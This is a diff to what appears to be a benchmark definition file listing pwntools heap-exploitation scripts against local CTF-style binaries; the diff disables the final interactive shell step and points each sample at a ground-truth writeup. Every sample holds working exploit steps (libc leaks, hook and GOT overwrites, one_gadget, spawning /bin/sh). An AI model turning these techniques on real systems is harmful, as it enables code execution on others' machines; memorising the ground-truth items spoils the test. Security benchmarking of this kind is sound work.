@@ -82,7 +82,7 @@ sample0 = EXPCode(
         "payload3 = p64(elf.plt['puts']);edit(0,len(payload3),payload3)",
         "ret = '0x' + free(1)[:6][::-1].hex()",
         "puts_addr = int(ret, 16);libc_addr = puts_addr - libc.sym['puts'] ;system_addr = libc_addr + libc.sym['system'];payload4 = p64(system_addr);edit(2,len(payload4),payload4)",
-        "p.interactive()",
+        #p.interactive(),
     ],
 )
 
@@ -148,7 +148,7 @@ sample1 = EXPCode(
         f"onegadget = free_addr - libc.symbols['free'] + 0x4527a;free_hook = free_addr - libc.symbols['free'] + libc.symbols['__free_hook'];pay = p64(free_hook);pay = pay.ljust(0xf0,b'\\x00');pay += p64(1);edit(31,pay)",
         "edit(32,p64(onegadget))",
         "free(0)",
-        "p.interactive()",
+        #p.interactive(),
     ],
 )
 
@@ -219,7 +219,7 @@ sample2 = EXPCode(
         "main_arena = u64(rc(6).ljust(8,b'\\x00')) - 88;libc_base = (main_arena&0xfffffffff000) - 0x3c4000;onegadget = libc_base + 0x4527a;free_hook = libc_base + libc.symbols['__free_hook'];edit(4,p64(free_hook) + b'\\n')",
         "edit(1,p64(onegadget) + b'\\n')",
         "free(2)",
-        "p.interactive()",
+        #p.interactive(),
     ],
 )
 
@@ -282,13 +282,13 @@ sample3 = EXPCode(
         "free_got = elf.got['free'];payload = 0x18 * b'a' + p64(free_got);edit_note(0, 1, payload)",
         "show_note(0);p.recvuntil('is ');free_addr = u64(p.recv(6).ljust(8, b'\\x00'))",
         "libc_addr = free_addr - libc.symbols['free'];system_addr = libc_addr + libc.symbols['system'];one_gadget = libc_addr + 0xf1247;edit_note(0, 1, p64(one_gadget))",
-        "p.interactive()",
+        #p.interactive(),
     ],
 )
 
 sample4 = EXPCode(
     ExpCodePath="./data/sample4.py",
-    DecompileCodePath="./data/sample4.c",
+    DecompileCodePath="./data/sample4-groundtruth-writeup.md",
     InitializeCode=[
         "from pwn import *",
         "import re",
@@ -411,13 +411,13 @@ sample4 = EXPCode(
         "perform_double_free()",
         "write_to_stack_and_get_shell(stackptr, libcbase)",
         "quit_app()",
-        "p.interactive()",
+        #p.interactive(),
     ],
 )
 
 sample5 = EXPCode(
     ExpCodePath="./data/sample5.py",
-    DecompileCodePath="./data/sample5.c",
+    DecompileCodePath="./data/sample5-groundtruth-writeup.md",
     InitializeCode=[
         "from pwn import *",
         "from LibcSearcher import *",
@@ -539,7 +539,7 @@ sample5 = EXPCode(
         "ingr_list_ptr = read_ptr(INGR_LIST)",
         "fgets_addr = read_ptr(FGETS_GOT)",
         "libc_addr = fgets_addr - fgets_off;system_addr = libc_addr + system_off;corrupt_curr_recipe_ptr(ingr_list_ptr, system_addr)",
-        "p.interactive()",
+        #p.interactive(),
     ],
 )
 
@@ -601,7 +601,7 @@ sample6 = EXPCode(
         "libc_base = u64(s.ljust(8, b'\\x00')) - atoi_offset;system = libc_base + system_offset;update(1, p64(system))",
         "add(2, b'sh\\0')",
         "de(2)",
-        "p.interactive()"
+        #p.interactive()
     ],
 )
 
@@ -658,7 +658,7 @@ sample7 = EXPCode(
         "alloc(0x60);alloc(0x60)",
         "libc_addr = malloc_hook-libc.symbols['__malloc_hook'];payload=p64(libc_addr+0x4527a);shllcode=b'a'*0x13+payload;fill(4,shllcode)",
         "alloc(1); p.sendline(b'bash')",
-        "p.interactive()"
+        #p.interactive()
     ],
 )
 
@@ -726,7 +726,7 @@ sample8 = EXPCode(
         "atoi_addr = u64(ru(b'\\n--')[4:10].ljust(8, b'\\x00'))",
         "onegadget = atoi_addr - libc.symbols[\"atoi\"] + 0xf03a4; change(0, 0x10, p64(onegadget))",
         "exit()",
-        "p.interactive()"
+        #p.interactive()
     ],
 )
 
@@ -773,7 +773,7 @@ sample9 = EXPCode(
         "modify(3, p64(free_got_plt)[0:4], b'1111')",
         "modify(0, p64(func_addr)[0:6], b'2222')",
         "delete(2)",
-        "p.interactive()"
+        #p.interactive()
     ],
 )
 
@@ -841,7 +841,7 @@ sample10 = EXPCode(
         "payload04 = p64(system);edit(0, 0x8, payload04)",
         "payload05 = b'/bin/sh\\x00';new(len(payload05), payload05)",
         "delete(4)",
-        "p.interactive()",
+        #p.interactive(),
     ],
 )
 
@@ -902,7 +902,7 @@ sample11 = EXPCode(
         "stack_addr = get_stack_addr(heap_addr)",
         "payload=b'27' + p32(0) + p32(0) + p32(stack_addr+0x20-0xc) + p32(elf.got['asprintf']+0x22);delete(payload)",
         "payload=b'sh\\x00\\x00'+p32(system_addr);p.sendline(payload)",
-        "p.interactive()",
+        #p.interactive(),
     ],
 )
 
@@ -952,7 +952,7 @@ sample12 = EXPCode(
         "payload = p64(0)*3 + p64(free_hook) + p64(0x48) + p64(ptr + 0x18) + b'/bin/sh\\x00';edit(0, payload)",
         "payload = p64(sys);edit(0, payload)",
         "delete(1)",
-        "p.interactive()",
+        #p.interactive(),
     ],
 )
 
@@ -1000,7 +1000,7 @@ sample13 = EXPCode(
         'add(0x60, p64(libc.sym["__malloc_hook"] - 0x23));add(0x60);add(0x60)',
         "one_gadget = libc.address + 0xf1247;payload = b'a' * 11 + p64(one_gadget) + p64(libc.sym['realloc']+2);add(0x60, payload)",
         'p.sendlineafter("Input your choice:", "1")',
-        "p.interactive()",
+        #p.interactive(),
     ],
 )
 
@@ -1050,13 +1050,13 @@ sample14 = EXPCode(
         "add(0x40);add(0x40)",
         "edit(3,p64(0))",
         "backdoor()",
-        "p.interactive()",
+        #p.interactive(),
     ],
 )
 
 sample16 = EXPCode(
     ExpCodePath="./data/sample16.py",
-    DecompileCodePath="./data/sample16.c",
+    DecompileCodePath="./data/sample16-groundtruth-writeup.md",
     InitializeCode=[
         "from pwn import *",
         "context.log_level = 'debug'",
@@ -1111,13 +1111,13 @@ sample16 = EXPCode(
         "libc_addr = atoi_addr - libc.symbols['atoi'];system_addr = libc.symbols['system'] + libc_addr;edit(b'3', p64(system_addr)[:-1])",
         "p.recvuntil(b'>>\\n')",
         "p.sendline(b'/bin/sh')",
-        "p.interactive()",
+        #p.interactive(),
     ],
 )
 
 sample15 = EXPCode(
     ExpCodePath="./data/sample15.py",
-    DecompileCodePath="./data/sample15.c",
+    DecompileCodePath="./data/sample15-groundtruth-writeup.md",
     InitializeCode=[
         "from pwn import *",
         "from pwncli import one_gadget",
@@ -1195,13 +1195,13 @@ sample15 = EXPCode(
         "add(size=0x60);add(size=0x60)",
         "edit(content=b'a'*(0x13 - 0x8) + p64(libc.address + one_gadget) + p64(libc.sym['realloc'] + 12))",
         "add(size=0x50)",
-        "p.interactive()",
+        #p.interactive(),
     ],
 )
 
 sample17 = EXPCode(
     ExpCodePath="./data/sample17.py",
-    DecompileCodePath="./data/sample17.c",
+    DecompileCodePath="./data/sample17-groundtruth-writeup.md",
     InitializeCode=[
         "from pwn import *",
         "context.log_level = 'debug'",
@@ -1255,7 +1255,7 @@ sample17 = EXPCode(
 
 sample18 = EXPCode(
     ExpCodePath="./data/sample18.py",
-    DecompileCodePath="./data/sample18.c",
+    DecompileCodePath="./data/sample18-groundtruth-writeup.md",
     InitializeCode=[
         "from pwn import *",
         "from LibcSearcher import *",
@@ -1308,13 +1308,13 @@ sample18 = EXPCode(
         "addRifle(b'15935728', p32(elf.got['__isoc99_sscanf']))",
         "leaveMessage(p32(system))",
         "p.sendline(b'/bin/sh')",
-        "p.interactive()",
+        #p.interactive(),
     ],
 )
 
 sample19 = EXPCode(
     ExpCodePath='./data/sample19.py',
-    DecompileCodePath='./data/sample19.c',
+    DecompileCodePath='./data/sample19-groundtruth-writeup.md',
     InitializeCode=[
         'from pwn import *',
         'import itertools',
@@ -1438,13 +1438,14 @@ sample19 = EXPCode(
         'leak = view(1);unsorted_bin = u64(leak);main_arena = unsorted_bin - 0x58;libc_base = main_arena - 0x3c4b20;libc_system = libc_base + libc.sym[\'system\'];free_hook = libc_base + libc.sym[\'__free_hook\']',
         'st = p64(0) + p64(0) + p64(0) + p64(0x13377331) + p64(storage) + p64(0x1000) + p64(free_hook) + p64(0x100) + p64(storage+0x50) + p64(0x100) + b\'/bin/sh\\x00\';update(0, st)',
         'update(1, p64(libc_system))',
-        'p.sendline(b\'3\');p.recvuntil(b\'Index: \');p.sendline(str(2).encode());p.interactive()',
+        'p.sendline(b\'3\');p.recvuntil(b\'Index: \');p.sendline(str(2).encode())',
+        #'p.interactive()',
     ],
 )
 
 sample20 = EXPCode(
     ExpCodePath="./data/sample20.py",
-    DecompileCodePath="./data/sample20.c",
+    DecompileCodePath="./data/sample20-groundtruth-writeup.md",
     InitializeCode=[
         "from pwn import *",
         "from LibcSearcher import *",
@@ -1490,13 +1491,13 @@ sample20 = EXPCode(
         "edit_note(1, p32(0x804b130) * 2 + p32(free_got) * 2 + b'/bin/sh')",
         "edit_note(2, p32(libc.sym['system']))",
         "del_note(0)",
-        "p.interactive()"
+        #p.interactive()
     ],
 )
 
 sample21 = EXPCode(
     ExpCodePath="./data/sample21.py",
-    DecompileCodePath="./data/sample21.c",
+    DecompileCodePath="./data/sample21-groundtruth-writeup.md",
     InitializeCode=[
         "from pwn import *",
         "context.log_level = 'debug'",
@@ -1544,13 +1545,13 @@ sample21 = EXPCode(
         "fake_chunk_addr = shellcode_addr + 0x50 - 0x90;setup_fake_chunk(fake_chunk_addr)",
         "arbitrary_write(shellcode_addr)",
         "trigger_shell()",
-        "p.interactive()",
+        #p.interactive(),
     ],
 )
 
 sample22 = EXPCode(
     ExpCodePath="./data/sample22.py",
-    DecompileCodePath="./data/sample22.c",
+    DecompileCodePath="./data/sample22-groundtruth-writeup.md",
     InitializeCode=[
         "from pwn import *",
         "context.log_level = 'debug'",
@@ -1610,13 +1611,13 @@ sample22 = EXPCode(
         "p.recvuntil(b' # CONTENT: ');environ_addr = p.recvuntil(b'\\n', drop=True).ljust(8, b'\\x00');environ_addr = u64(environ_addr)",
         "main_ret_addr = environ_addr - 30 * 8;edit(2, p64(main_ret_addr));edit(1, p64(one_gadget_addr))",
         "p.recvuntil(b'(CMD)>>> ');p.sendline(b'Q')",
-        "p.interactive()",
+        #p.interactive(),
     ],
 )
 
 sample23 = EXPCode(
     ExpCodePath="./data/sample23.py",
-    DecompileCodePath="./data/sample23.c",
+    DecompileCodePath="./data/sample23-groundtruth-writeup.md",
     InitializeCode=[
         "from pwn import *",
         "p = process('./data/sample23')",
@@ -1666,13 +1667,13 @@ sample23 = EXPCode(
         "add(0x40)",
         "payload = p64(0) * 2+p64(0) * 6;edit(2,payload)",
         "p.sendlineafter(b'Choice: ',b'666');p.send(p64(0)*6)",
-        "p.interactive()",
+        #p.interactive(),
     ],
 )
 
 sample24 = EXPCode(
     ExpCodePath="./data/sample24.py",
-    DecompileCodePath="./data/sample24.c",
+    DecompileCodePath="./data/sample24-groundtruth-writeup.md",
     InitializeCode=[
         "from pwn import *",
         "context.log_level = 'debug'",
@@ -1768,13 +1769,13 @@ sample24 = EXPCode(
         "add(0x40)",
         "rop = getRop(heap, libc_base, libc);edit(7,rop)",
         "dele(7)",
-        "p.interactive()",
+        #p.interactive(),
     ],
 )
 
 sample25 = EXPCode(
     ExpCodePath="./data/sample25.py",
-    DecompileCodePath="./data/sample25.c",
+    DecompileCodePath="./data/sample25-groundtruth-writeup.md",
     InitializeCode=[
         "from pwn import *",
         "context.log_level = 'debug'",
@@ -1823,13 +1824,13 @@ sample25 = EXPCode(
         "create(11,0x68);create(13,0x68)",
         "ogg = libc_addr + 0x4526a+6;realloc_hook = libc_addr+libc.sym['realloc'];edit(13,b'a'*3+p64(0)+p64(ogg)+p64(realloc_hook+16))",
         "create(14,20)",
-        "p.interactive()",
+        #p.interactive(),
     ],
 )
 
 sample26 = EXPCode(
     ExpCodePath="./data/sample26.py",
-    DecompileCodePath="./data/sample26.c",
+    DecompileCodePath="./data/sample26-groundtruth-writeup.md",
     InitializeCode=[
         "from pwn import *",
         "context.log_level = 'debug'",
@@ -1890,13 +1891,13 @@ sample26 = EXPCode(
         "p.recvuntil(b'delete?\\n');puts_addr = p.recvline()[:-1]",
         "puts_addr = int.from_bytes(puts_addr,'little');libc_addr = puts_addr - libc.symbols['puts'];system_addr = libc_addr + libc.symbols['system'];edit(2,p64(system_addr))",
         "p.send(b'/bin/sh\\x00')",
-        "p.interactive()",
+        #p.interactive(),
     ],
 )
 
 sample27 = EXPCode(
     ExpCodePath="./data/sample27.py",
-    DecompileCodePath="./data/sample27.c",
+    DecompileCodePath="./data/sample27-groundtruth-writeup.md",
     InitializeCode=[
         "from pwn import *",
         "context.log_level = 'debug'",
@@ -1979,6 +1980,6 @@ sample27 = EXPCode(
         "libc_leak = u64(read_at(heap_base + 0x11e0).ljust(8, b'\\x00')) - (libc.sym['__malloc_hook'] + 0x10 + 0x58);libc.address = libc_leak",
         "write_to(libc.sym['__free_hook'], p64(libc.sym['system']), 0x10)",
         "remove(6)",
-        "p.interactive()",
+        #p.interactive(),
     ],
 )
